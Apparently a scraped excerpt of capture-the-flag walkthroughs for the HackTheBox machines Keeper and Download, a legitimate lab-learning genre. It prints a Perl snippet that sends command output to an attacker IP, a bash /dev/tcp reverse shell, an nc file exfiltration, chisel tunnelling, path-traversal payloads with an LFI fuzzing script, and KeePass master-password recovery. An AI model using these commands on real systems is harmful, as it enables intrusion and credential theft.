WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt&#34; OUTPUT=&#34;fuzzing/feroxbuster-root.json&#34; feroxbuster -w $WLIST -u http://$DOMAIN -A -d 1 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 --output $OUTPUT Running Feroxbuster against http://keeper.htb/ had no results other than the page itself.
OUTPUT=&#34;fuzzing/feroxbuster-tickets.json&#34; feroxbuster -w $WLIST -u http://tickets.$DOMAIN -A -d 1 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 --output $OUTPUT Finally, I decided to try running Feroxbuster against the /rt web application, providing a cookie to go with it:
OUTPUT=&#34;fuzzing/feroxbuster-rt.json&#34; feroxbuster -w $WLIST -u http://tickets.$DOMAIN/rt -A -d 2 -t 100 -T 4 -f --auto-tune --collect-words --filter-status 400,401,402,403,404,405 --output $OUTPUT -b &#34;RT_SID_tickets.keeper.htb.80=2cb0fe766fdbb24f3c96fb458eb27fbd; TitleBox--_index_html------MTAgaGlnaGVzdCBwcmlvcml0eSB0aWNrZXRzIEkgb3du---0=1; TitleBox--_Admin_Scrips_Create_html------VXNlciBEZWZpbmVkIGNvbmRpdGlvbnMgYW5kIHJlc3VsdHM_---0=1&#34; --burp &hellip; And this provided a mountain of output. Instead, I&rsquo;ll try an equivalent GoBuster:
gobuster dir -w $WLIST -u http://tickets.$DOMAIN/rt --random-agent -t 100 --timeout 4s -f --status-codes-blacklist 400,401,402,403,404,405 --output $OUTPUT -c &#34;RT_SID_tickets.keeper.htb.80=2cb0fe766fdbb24f3c96fb458eb27fbd; TitleBox--_index_html------MTAgaGlnaGVzdCBwcmlvcml0eSB0aWNrZXRzIEkgb3du---0=1; TitleBox--_Admin_Scrips_Create_html------VXNlciBEZWZpbmVkIGNvbmRpdGlvbnMgYW5kIHJlc3VsdHM_---0=1&#34; --proxy &#34;http://127.0.0.1:8080&#34; --no-error The result was much more digestable:
OSINT The tickets.keeper.htb subdomain appears to be some kind of IT Helpdesk ticket tracking system, with a prominent login form:
The footer of the page shows the following:
»|« RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 Best Practical Solutions, LLC.
Distributed under version 2 of the GNU GPL. To inquire about support, training, custom development or licensing, please contact sales@bestpractical.com.
Following the &ldquo;Best Practical Solutions&rdquo; link shows from the landing page&rsquo;s banner that the target&rsquo;s software version, 4.4.4+dfsg-2ubuntu1 is out of date:
The link in the banner leads to the details on the release, and a link at the bottom of that page leads to the full release notes. Some important snippets of the 5.0.4 release notes are below, and it also references their github repo:
The 5.0.5 release notes
Security * jQuery UI is updated to version 1.13.2, which addresses a security issue in earlier jQuery UI (CVE-2022-31160). This issue does not impact RT directly as RT does not currently use the impacted code. Developer * Update .gitignore to ignore all of var/ to help protect developers from accidentally checking in session data or RT databases in var/ * Add a warning as a hint to RT developers about WebSecureCookies The 4.4.6 release notes
Security The following security issues are fixed in this release. Thanks to the Polish Financial Supervision Authority IT Security Department (UKNF) for reporting the issue below. * RT is vulnerable to cross-site scripting (XSS) when displaying attachment content with fraudulent content types. This vulnerability is assigned CVE-2022-25802. * RT did not perform full rights checks on accesses to file or image type custom fields, possibly allowing access to these custom fields by users without rights to access to the associated objects (like the ticket it is associated with). And the configuration instructions on their github page shows the following:
7) Configure the web server, as described in docs/web_deployment.pod, and the email gateway, as described below. NOTE: The default credentials for RT are: User: root Pass: password Not changing the root password from the default is a SECURITY risk! When you find something as easy as default credentials, it makes sense to try them right away. And whatd&rsquo;ya know&hellip;
&hellip; they worked! Superb. The most interesting part of this dashboard looks like the &ldquo;Admin&rdquo; menu. Admin &gt; Users shows that there are just two users in the web app, one of which is root:
The &ldquo;Scrip&rdquo; System The option Admin &gt; Scrips also looks interesting. Is that just a typo? It looks like it&rsquo;s used for selecting or creating new &ldquo;scrips&rdquo;, which are automated actions that are performed when a specified condition occurs:
Choosing &ldquo;User Defined&rdquo; for either Condition or Action allows the administrator to define the details of the &ldquo;scrip&rdquo;. The form doesn&rsquo;t make it super obvious how this is done, so I looked through their git repo to find an explanation. Thankfully, I ran into Manual-Scrips within their online user manual. The code looks a lot like Perl.
Custom Action Commit/Preparation Code:
$self-&gt;ScripActionObj RT::ScripAction, $self-&gt;ScripObj RT::Scrip, $self-&gt;TemplateObj RT::Template, $self-&gt;TicketObj RT::Ticket, $self-&gt;TransactionObj RT::Transaction, This seems promising. Maybe it will even be as simple as using a perl reverse shell or webshell?
FOOTHOLD Custom Scrip Definition Note: While this is one route towards the flag, it is not the most direct route. If you&rsquo;re short on time, please skip ahead to section USER FLAG &gt; Revisiting the Web App for a more straightforward solution. If you want the extra context for the box, or want to learn how to do SSRF using Perl, please read on.
Clearly, the Scrips feature of RT has the ability to run Perl code. To try this out, I&rsquo;ll define a custom scrip. The condition will simply be set to creating a new ticket, but the action will be set to User Defined. I&rsquo;ll try a simple perl reverse shell:
Clicking the &ldquo;click here to resume your request&rdquo; link simply leads to a 404 page.
To bypass this, I swapped out the destination of the link from being http ://keeper.htb/rt/Admin/Scrips/Modify.html?CSRF_Token=4024b14add0dbd362421caa3a0939815
to being: http://**tickets.**keeper.htb/rt/Admin/Scrips/Modify.html?CSRF_Token=4024b14add0dbd362421caa3a0939815
It seems like I must use this same trick all over the website for the same reason. Either that, or figure out a way to include a referrer header in every request.
Unfortunately, my reverse shell attempt was unsuccessful. Not sure why, yet.
While researching this &ldquo;Scrips&rdquo; feature, I found a CVE noting a possible SSRF, so I decided to try it out. I set this as the &ldquo;preparation&rdquo; and &ldquo;commit&rdquo; code of a Custom Action:
The &ldquo;commit&rdquo; action requests /ssrf-success-commit but is otherwise the same.
use LWP::UserAgent; my $url = &#39;http://10.10.14.10:8000/ssrf-success-preparation&#39;; my $ua = LWP::UserAgent-&gt;new; my $response = $ua-&gt;get($url); if ($response-&gt;is_success) { my $content = $response-&gt;decoded_content; print &#34;Response:\\n$content\\n&#34; } Success! Interestingly, only the &ldquo;preparation&rdquo; code was successful&hellip; I&rsquo;ll go back and try a reverse shell, but this time I&rsquo;ll put the code into the &ldquo;preparation action&rdquo; (I used &ldquo;commit&rdquo; earlier):
Next I&rsquo;ll verify my firewall is open and start the reverse shell listener:
sudo ufw allow from $RADDR to any port 4444 bash # Usually I&#39;m in zsh socat -d -d TCP-LISTEN:4444 STDOUT And to trigger the reverse shell I&rsquo;ll try creating a ticket. Still no luck though. Hmm&hellip;. I&rsquo;ll look around the web app a little more and see if I&rsquo;m missing something.
Oh, DUH! I had neglected to check for open tickets! There is one open ticket, assigned to the other user:
Now I know there should be a file inside Lise&rsquo;s home directory. I&rsquo;ll try combining this knowledge with my successful SSRF from earlier to eventually read whatever that attachment is.
I made a new Script, using this as &ldquo;preparation&rdquo; code:
use LWP::UserAgent; my $output = \`ls /home | base64 -w 0\`; my $url = &#39;http://10.10.14.10:8000/ssrf?result=&#39; . $output; my $ua = LWP::UserAgent-&gt;new; my $response = $ua-&gt;get($url); if ($response-&gt;is_success) { my $content = $response-&gt;decoded_content; print &#34;Response:\\n$content\\n&#34; } After creating a new ticket, I saw the following request come in to my webserver:
10.10.11.227 - - [13/Aug/2023 13:57:37] code 404, message File not found 10.10.11.227 - - [13/Aug/2023 13:57:37] &#34;GET /ssrf?result=bG5vcmdhYXJkCg== HTTP/1.1&#34; 404 - Decoding this using base64 --decode yields a single word: lnorgaard. Great! Now I&rsquo;ll see if, for some reason, I have read access to their home directory:
10.10.11.227 - - [13/Aug/2023 14:02:25] code 404, message File not found 10.10.11.227 - - [13/Aug/2023 14:02:25] &#34;GET /ssrf?result=UlQzMDAwMC56aXAKdXNlci50eHQK HTTP/1.1&#34; 404 - Haha OK, that was easier than I thought it would be. I&rsquo;ll try using this same technique to plant an SSH key into their home directory, then. I generated an rsa keypair using the password &ldquo;lise&rdquo;, and made a bash one-liner to plant the key:
Hmm, nope. No &ldquo;result&rdquo; came back to my webserver. I tried connecting using SSH and the generated key anyway, and it did not work. To check if this was a permissions issue or not, I tried two more commands: one to check what user I was executing commands as, and the other to check permissions on /home/lnorgaard; they were id and ls -laR /home/lnorgaard:
uid=33(www-data) gid=33(www-data) groups=33(www-data) /home/lnorgaard: total 85384 drwxr-xr-x 4 lnorgaard lnorgaard 4096 Jul 25 20:00 . drwxr-xr-x 3 root root 4096 May 24 16:09 .. lrwxrwxrwx 1 root root 9 May 24 15:55 .bash_history -&gt; /dev/null -rw-r--r-- 1 lnorgaard lnorgaard 220 May 23 14:43 .bash_logout -rw-r--r-- 1 lnorgaard lnorgaard 3771 May 23 14:43 .bashrc drwx------ 2 lnorgaard lnorgaard 4096 May 24 16:09 .cache -rw------- 1 lnorgaard lnorgaard 807 May 23 14:43 .profile -rw-r--r-- 1 root root 87391651 Aug 13 17:30 RT30000.zip drwx------ 2 lnorgaard lnorgaard 4096 Jul 24 10:25 .ssh -rw-r----- 1 root lnorgaard 33 Aug 13 11:25 user.txt -rw-r--r-- 1 root root 39 Jul 20 19:03 .vimrc Well, at least that explains why I couldn&rsquo;t plant an SSH key. I couldn&rsquo;t get the Perl reverse shell working (for whatever reason), but since I clearly have a reliable RCE, why don&rsquo;t I just try a simple bash reverse shell?
I once gain submitted a Scrip with custom &ldquo;preparation&rdquo; code, this time using a simple bash reverse shell:
use LWP::UserAgent; my $output = \`bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.10/4444 0&gt;&amp;1&#39;\`; my $url = &#39;http://10.10.14.10:8000/ssrf?result=&#39; . $output; my $ua = LWP::UserAgent-&gt;new; my $response = $ua-&gt;get($url); if ($response-&gt;is_success) { my $content = $response-&gt;decoded_content; print &#34;Response:\\n$content\\n&#34; } It worked! Wonderful &#x1f43b;
Now that I have a reverse shell, I&rsquo;ll try transferring that &ldquo;crash dump&rdquo; that ticket #30000 referred to. I&rsquo;ll try the simplest way first, using nc. On the attacker box I opened a nc listener, then on the target I transferred the file. While the attacker box was receiving the file, I watched the file size using watch ls -lah
sudo ufw allow from $RADDR to any port 4445 nc -lvnp 4445 &gt; RT30000.zip nc -nv 10.10.14.10 4445 &lt; /home/lnorgaard/RT30000.zip Once the file size stopped changing, I killed the connection from the attacker size, and ran sha256sum over the file on both hosts. To my amazement, they matched, even 84MB later!
The file itself is in .zip format. When extracted, it produces two files: KeePassDumpFull.dmp and passcodes.kdbx.
A kdbx file is a Keepass password database file. KeePass is like an offline password manager: it unlocks with a master password and contains other passwords. If I could get into this file, I bet there are some goodies inside.
The .dmp file could be anything, though. According to the message chain uncovered from with the RT ticket history for ticket #30000, this file is a crash dump for KeePass on Windows. Not knowing what to open it with, I tried running the .dmp file through binwalk. There is all kinds of data in there, but at least a couple of times it mentions the following:
gzip compressed data, maximum compression, has original file name: &ldquo;MostPopularPasswords.txt&rdquo;, from FAT filesystem (MS-DOS, OS/2, NT), last modified: 2013-07-01 17:20:34
It&rsquo;s a little strange. Maybe it&rsquo;s a hint about the passcodes.kdbx file. Not sure. I&rsquo;ll come back to it later &#x1f6a9;.
USER FLAG User Enumeration: www-data Unfortunately, enumeration is a bit slow-going with this reverse shell. However, I&rsquo;ve discovered a few things:
www-data has write access to a few important directories: /var/lib/request-tracker4, /var/mail/www-data, and /var/cache/request-tracker4. The mail file simply shows the message chain that I already saw with the RT web app. I ran linpeas, which did not say much, but did point out the RT configuration files. One of these config files is the database configuration file for RT:
For copy-pasting, that connection is on localhost:3306, database &ldquo;rtdb&rdquo;, credentials: rtuser : x7UiXkF55nnfC0h. To access it, I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse --key s4ucys3cret Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; Perfect, now I&rsquo;ll try connecting to the MySQL database using my attacker machine:
proxychains mysql -u rtuser -h 127.0.0.1 -p I checked out the Users table first, which seemed promising:
However, as soon as I tried to perform a query, everything just stalled-out&hellip; completely nonresponsive.
At this point I&rsquo;m getting really sick of rebuilding my reverse shell, downloading my tools, etc. I decided to take another look at the web app itself to see if I was missing something visible from the outside.
&#x1f4a1; Edit: When i rebuilt my connection, I discovered that, had I gotten even a single step further with checking out this database, I would have recovered the password to lnorgaard in a different way - (turns out it is available by two methods: using the database to get it is the longer, more difficult of the two methods)
Oh well. Frustrating, but you can&rsquo;t do everything perfect.
Revisiting the Web App Yep&hellip; right away I found what I had missed. I have been working way way way too hard. I think I need to put a sticker on my laptop saying &ldquo;search wide, not deep&rdquo;. The credentials for lnorgaard are right there, out in the open, under Admin &gt; Users &gt; Select:
Excellent, so the credentials for lise are lnorgaard : Welcome2023!
&#x1f915; I feel so stupid for going down that whole SSRF and reverse shell rabbit hole. But hey, kinda cool I found another way to get in though, I suppose. The SSH connection drops you into /home/lnorgaard, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG User Enumeration - lnorgaard I performed my usual Linux User Enumeration strategy. However, I did not uncover much in terms of meaningful results. This is the only seemingly meaningful information that I did find:
lnorgaard cannot sudo at all. Very few directories are writable. The /var/mail/lnorgaard file shows the same email chain as was seen earlier using the RT web app. It alludes to the KeePass crash dump that is in the home directory. Linpeas had nothing additional. KeePass Crash Dump What am I going to do with this 84MB zip file, and its crash dump .dmp file inside? To get a little context on the problem, I started with some google search. Searching or the terms &ldquo;KeePass crash dump exploit&rdquo; was full of references to a CVE from this year: CVE-2023-32784. Not only that, but the very first result of the search was some PoC code to exploit that CVE.
As it turns out, some statistical measurements can be made using system memory and caching, which allows the KeePass master password to be uncovered, to some degree. One notable tool for recovering these is shown in this github repo. However, since it relies on dotnet (and I did not want to deal with the hassle of setting up a .Net environment), I took a look at one of the alternative tools in the links at the bottom of that repo. The Python one, shown in this github repo, looked especially easy to use. Why not try it out?
My guess is that I can use this tool to scan the .dmp file, to recover the password for the .kdbx file. I cloned the repo, and ran the tool using the .dmp file as an input:
git clone https://github.com/CMEPW/keepass-dump-masterkey.git python3 poc.py ../RT30000/KeePassDumpFull.dmp It calculated for a minute, but then spat out a bunch of possible passwords!
Amazing. I&rsquo;ll have to come back to this tool and read about how it works. It&rsquo;s interesting that the unknown characters are all in the same positions. While it would be easy to scrap together a python script for this, it&rsquo;s probably even easier to use hashcat. I&rsquo;ll pretend that the second character (the only character different between those lines) is also a variable character. I&rsquo;ll use hashcat in mask attack mode to accommodate this:
hashcat --help | grep -i keepass 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager hashcat -a 3 -m 13400 keepass.hc &#39;?a?adgr?ad med fl?ade&#39; And&hellip; it didn&rsquo;t find a match! How annoying. I even re-tried using the special Danish letters that are not in ASCII - still no luck. So, I did as anyone does these days and summoned the power of big data / search: I plonked it into google, with question marks where the unknown letters are, and immediately got a bunch of baking blogs?! Well, it turns out there is a famous Danish dessert called a &ldquo;Rødgrød med fløde&rdquo; (it&rsquo;s like a pudding with berries in it).
So I tried that password as shown below, in lowercase, uppercase, and propercase. Turns out lowercase was the winner.
Following along with the instructions from the python tool, keepass-dump-masterkey, once the password is obtained it can be used with kpcli to log in to the keypass .kdbx file.
kpcli:/&gt; open passcodes.kdbx Provide the master password: ************************* # Entered &#39;rødgrød med fløde&#39; That worked, now I&rsquo;ll see what the contents are. By using tab-completion with the show command, I found two keys:
kpcli:/&gt; show -f passcodes/Network/ passcodes/Network/keeper.htb\\ (Ticketing\\ Server) passcodes/Network/Ticketing\\ System While the second one just shows the lnorgaard credential, the first one shows something much more interesting:
That&rsquo;s a PuTTY RSA key file. PuTTY is a little more annoying that SSH to use; there are a few specific things to do. At this point, all I know is that it works a little differently, and that I can&rsquo;t use regular ssh, so I&rsquo;ll install some PuTTY tools from my package manager:
sudo apt install putty putty-tools I&rsquo;ll try generating a new key using puttygen (basically a drop-in replacement for ssh-keygen):
puttygen -t rsa -b 1024 -o root_id_rsa # Entered the password I found in the kdbx file The resulting file had a different Encryption field than the one from the kdbx file. I guess I wasn&rsquo;t supposed to use a password? Also, I could see that the file was too short, so I tried the next step up in length (2048b):
puttygen -t rsa -b 2048 -o root_id_rsa2 # Did not specify a password This one looked like it was in the right format - which was the whole point of trying puttygen. Next, I&rsquo;ll copy the entry from the kdbx file into a separate file, root_id_rsa3:
I think now it&rsquo;s finally ready to use. I opened up PuTTY, specified the connection address and the key:
Once the address and key are specified, I clicked Open and was presented with a terminal. I just had to specify the username root, and I was finally in:
Now I am able to cat out the flag for those sweet sweet root flag points &#x1f352;
cat /root/root.txt You may be wondering what the mail was. Well, you know all those times when you sudo something on a box where you do not have sudo access, and it tells you THIS INCIDENT WILL BE REPORTED&hellip;. Yeah it was just pages and pages of that. A bunch of failed login and sudo attempts &#x1f602;
LESSONS LEARNED Attacker Key idea. Idea details go here.
Key idea. Idea details go here.
Defender Key idea. Idea details go here.
Key idea. Idea details go here.
`,url:"https://4wayhandshake.github.io/walkthrough/keeper/"},"https://4wayhandshake.github.io/walkthrough/download/":{title:"Download",tags:["Directory Traversal","LFI","Query Injection","Credential Re-use","PostgreSQL","TTY Hijacking","SUID Bash"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION Currently, Download is still active. It was released as the eighth box for HTB&rsquo;s Hackers Clash: Open Beta Season II (Half done the season now!). When Download was released, it was originally marked as Medium - now it is Hard. I agree with this: discovering vulnerabilities on the box was quite obscure, more like a Hard difficulty box, but once you find those vulnerabilities, exploiting them is relatively easy. Gaining a foothold is the hardest part of Download, happening in two steps: the first requires careful code analysis and possibly creating some tools of your own; the second requires a creative re-application of techniques usually used for a different type of application. For privilege escalation A bit of knowledge of the old ways of privilege escalation will be invaluable for getting the root flag.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan.txt $RADDR Nmap scan report for 10.10.11.226 Host is up (0.18s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Is this one entirely web? To investigate a little further, I ran a script scan over the ports I just found:
sudo nmap -sV -sC -n -Pn -p22,80 -oN nmap/script-scan.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA) | 256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA) |_ 256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://download.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Just to be sure I got everything, I ran a script scan for the top 4000 most popular ports:
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR # No new results Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=download.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Alright, that&rsquo;s the expected result. Nothing else though. Now I&rsquo;ll check for subdomains of download.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.download.htb&#34; -c -t 60 -o fuzzing/vhost-download.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://download.htb. Some known/expected results include /home, /files/upload, /files/download, /auth/login and /auth/logout:
Note: When I first ran directory enumeration, I got lots of nuisance HTTP status 200 results, each of size 2066B - so those are filtered out in the following ffuf command
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v -fs 2066 Directory enumeration against http://download.htb/ gave the following:
Let&rsquo;s check what kind of file operations exist, using a known file identifier/hash. I&rsquo;ll check all combinations of HTTP verbs with a bunch of words describing file operations:
I made a little file containing file operations, fileops.txt:
download upload delete copy link Then I enumerated using both wordlists using a known file identifier/hash:
VERBS=/usr/share/seclists/Fuzzing/http-request-methods.txt OPS=fuzzing/fileops.txt ffuf -w $OPS:OPERATION -w $VERBS:VERB -u http://$DOMAIN/files/OPERATION/6dc01539-77ef-424e-9ae2-0a0626a4f032 -t 80 -c -timeout 4 -v -X VERB -fs 2066 This resulted in a shocking amount of results:
upload: HEAD, TRACE delete: OPTIONS, TRACE, HEAD, POST download: HEAD, OPTIONS, TRACE, GET link: TRACE, HEAD copy: TRACE, HEAD Exploring the Website The website is a nice, minimal webapp for doing file uploads and transfers. They claim to solve the problem of transferring large files. It&rsquo;s a great idea (although been done many times before.)
I tried the Upload feature, without logging in. It seemed to work exactly as stated: I was able to upload a file, send a link to it elsewhere, and download it again - all without creating a user.
Then I tried registering a user ( jimbob : password ) and uploading a couple more files - both photos: one marked Private and the other not. Again, it worked exactly as expected:
I wanted to see how the request to do a download was formed, so I proxied my connection through Burp and clicked the Download button on one of the files:
Ok, no surprises there. I didn&rsquo;t find any meaningful decoded version of the resource &ldquo;6dc01539-77ef-424e-9ae2-0a0626a4f032&rdquo; . However, the download_session cookie decodes to a fairly predictable object:
{ &#34;flashes&#34;: { &#34;info&#34;:[], &#34;error&#34;:[], &#34;success&#34;:[] }, &#34;user&#34;:{ &#34;id&#34;:18, &#34;username&#34;:&#34;jimbob&#34; } } This got me wondering about the encoding of the resource tag (6dc01539-77ef-424e-9ae2-0a0626a4f032). Is it just a hash? is part of it based on the filename, or content? To investigate, I uploaded a small text file created as echo test &gt; AAAA.txt:
The resulting resource was 17939dcf-0198-48f3-83b2-a2383de25274. Comparing this to the other two resources 6dc01539-77ef-424e-9ae2-0a0626a4f032 and 5fbcb428-b957-48ed-bbb5-48dd4cf91c66 shows that there is no apparent connection. Could be something like a CRCs or hashes of the filename, private, database ID, file contents, anything really.
Checking for a Path Traversal The results from this section were actually not useful. Skip to the next section if you&rsquo;re short on time. If anything, this section illustrates how it can sometimes seem like you&rsquo;ve found something when you actually have not
Regardless of the format of the resource identifier, something we know for sure is that the resource identifier is persistent. So maybe it is a filename? To investigate, I used ffuf in the same way I would normally scan for LFI:
My initial attempt at this ffuf had a lot of nuissance HTTP 200 responses of size 2147B. This filters them out:
LFI=/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt COOKIES=&#34;download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTgsInVzZXJuYW1lIjoiamltYm9iIn19; download_session.sig=ZCMwd0W7LVm7qQygLD45vGiFpLo&#34; ffuf -w $LFI:LFI -u http://$DOMAIN/files/download/LFI -b $COOKIES -t 80 -c -timeout 4 -v -fs 2147 The results were surprising, showing a clear pattern:
To verify, I ran the same scan using an LFI wordlist that is ten times the size and received identical results. Since these are 403 Forbidden responses, the actual file is unimportant. What&rsquo;s interesting about this is the file depth and traversal format of the /etc/passwd and /etc/shadow cases:
The depth is identical, showing that the downloadable files are at a location 10 directories deep. The way to traverse the directories is with a backslash, for example ..\\..\\..\\ Now that I know the traversal format, I can try enumerating part of the web app:
WLIST=/usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt ffuf -w $WLIST:FUZZ -u &#34;http://$DOMAIN/files/download/..\\FUZZ&#34; -b $COOKIES -e .txt,.php,.html,.js -t 80 -c -timeout 4 -v -fs 136 FOOTHOLD Scripting the Path Traversal I wanted to automate the process of extending the LFI to different depths, so I wrote a bash script. Initially, it was pretty rudimentary: just construct a path traversal using the provided string (ex. ..\\) in a loop: go one level deeper for every iteration of the loop. For each of these, run ffuf targeting the base directory concatenated to the traversal. This is my original script:
#!/bin/bash TARGET=$1 # Ex. http://download.htb/files/download/ T=$2 # Ex. &#39;..\\&#39; MIN=$3 # Min number of traversal pattern applied MAX=$4 # Max number of traversal pattern applied COOKIES=$5 # Ex. &#39;key1=val1; key2=val2&#39; WLIST=$6 # Filepath to wordlist FILTERSIZE=$7 # Integer size in bytes to filter for invalid responses EXT=$8 # Ex &#39;-e &#34;.html,.php,.js&#34;&#39; # EXAMPLE: # ./lfi-scan.sh http://download.htb/files/download/ &#39;..\\&#39; 0 10 $COOKIES $WLIST 136,2147 &#39;-e .php,.html,.js,.txt&#39; FUZZ=&#34;FUZZ&#34; if [ &#34;$#&#34; -lt 8 ]; then echo &#34;Invalid args provide.&#34; echo &#34;Usage: $0 &lt;target&gt; &lt;traversal&gt; &lt;min&gt; &lt;max&gt; &lt;cookies&gt; &lt;wordlist&gt; &lt;filter_size&gt; &lt;extensions&gt;&#34; exit 1 fi for (( i=$MIN; i&lt;$MAX; i++ )); do TRAVERSAL=&#39;\\&#39; for (( j=0; j&lt;$i; j++ )); do TRAVERSAL=&#34;$TRAVERSAL$T&#34; done TGT=&#34;$TARGET$TRAVERSAL$FUZZ&#34; ffuf -w $WLIST:FUZZ -u $TGT -b $COOKIES -t 80 -c -timeout 4 -v -fs $FILTERSIZE $EXT done It was still a little fiddly though. I quickly learned that the results from the earlier ffuf attempts were not actually useful.
While reading through the Hacktricks page on File Inclusion / Path Traversal, it started to seem like maybe I was using the wrong encoding or filter bypasses. As a result, I wrote out a bunch of these encoding and filter bypass tricks into a file, with one &ldquo;traversal format&rdquo; per line:
../ ..\\ ....// ....\\/ %2e%2e%2f %2e%2e%5c ..%2f ..%25 ..%252f ..%c0%af %252e%252e%252f Then I adjusted my script to use each of these in sequence, instead of relying on just the provided traversal format.
I wanted a script that I could &ldquo;hit go&rdquo;, go have dinner, watch some tv, and come back to an actual LFI &#x1f605;
A few tweaks later, my script was in its final form (available on my github here: https://github.com/4wayhandshake/LFI-Enumerator)
Wonderful! The script found that app.js is accessible at http://download.htb/files/download/%2e%2e%2fapp.js (i.e. single url-encoding was the trick).
Knowing that, I started downloading the code:
mkdir source &amp;&amp; cd source TARGET=http://download.htb/files/download/%2e%2e%2f FILE=app.js curl -b $COOKIES -o $FILE &#34;$TARGET$FILE&#34; Downloading the Source Code Since this is an Express app, app.js is kind of the &ldquo;main&rdquo; script. From here, I can figure out how every other file is loaded, and hopefully use the same LFI to obtain those files too. Hints at the other files are all in the import statements at the beginning of app.js:
&#34;use strict&#34;; var __importDefault = (this &amp;&amp; this.__importDefault) || function (mod) { return (mod &amp;&amp; mod.__esModule) ? mod : { &#34;default&#34;: mod }; }; Object.defineProperty(exports, &#34;__esModule&#34;, { value: true }); const express_1 = __importDefault(require(&#34;express&#34;)); const nunjucks_1 = __importDefault(require(&#34;nunjucks&#34;)); const path_1 = __importDefault(require(&#34;path&#34;)); const cookie_parser_1 = __importDefault(require(&#34;cookie-parser&#34;)); const cookie_session_1 = __importDefault(require(&#34;cookie-session&#34;)); const flash_1 = __importDefault(require(&#34;./middleware/flash&#34;)); const auth_1 = __importDefault(require(&#34;./routers/auth&#34;)); const files_1 = __importDefault(require(&#34;./routers/files&#34;)); const home_1 = __importDefault(require(&#34;./routers/home&#34;)); const client_1 = require(&#34;@prisma/client&#34;); const app = (0, express_1.default)(); const port = 3000; const client = new client_1.PrismaClient(); const env = nunjucks_1.default.configure(path_1.default.join(__dirname, &#34;views&#34;), { autoescape: true, express: app, noCache: true, }); [...SNIP...] I see mentions of a middleware, the router files, and some views. I&rsquo;ll try to download the code and reassemble the web app locally Every time I encountered a file, I did some variation of the following:
FILE=&#34;middleware%2fflash.js&#34; curl -b $COOKIES -o middleware/flash.js &#34;$TARGET$FILE&#34; Starting from app.js, I did this for every reference to another file in the web app, and then downloaded all references in those files, and so on. While I&rsquo;m probably missing something, I think I&rsquo;ve gathered up the majority of the application now:
This is a node.js application, so it necessarily has a package.json file. This file is especially important, as it shows the version of every module that is imported into the application.
Analyzing app.js Right away, checking package.json revealed something a little suspicious. Anyone who&rsquo;s ever started a new Node.js project knows that the very first thing you&rsquo;re asked is for all the details of the package, like the name, version, description, entrypoint, author, and license - and that it&rsquo;s routine to just mash [Enter] to get through all these prompts.
Anything seem off, here?
